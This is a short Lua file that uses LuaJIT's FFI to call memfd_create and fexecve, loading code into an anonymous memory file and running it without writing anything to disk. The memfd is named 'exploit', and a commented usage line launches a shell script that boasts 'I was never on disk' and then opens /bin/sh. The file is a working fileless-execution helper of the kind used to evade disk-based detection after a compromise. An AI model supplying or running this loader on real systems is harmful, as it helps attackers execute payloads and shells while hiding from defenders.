-- memfd_exec.lua
local ffi = require("ffi")

ffi.cdef[[
    int memfd_create(const char *name, unsigned int flags);
    int fexecve(int fd, char *const argv[], char *const envp[]);
]]

local function exec_in_memory(code)
    local fd = ffi.C.memfd_create("exploit", 0)
    
    -- Write code to memory file
    local f = io.open(string.format("/proc/self/fd/%d", fd), "wb")
    f:write(code)
    f:close()
    
    -- Execute
    ffi.C.fexecve(fd, ffi.new("char*[2]", {"exploit", nil}), ffi.new("char*[1]", {nil}))
end

-- Usage
-- exec_in_memory("#!/bin/sh\necho 'I was never on disk' && /bin/sh")
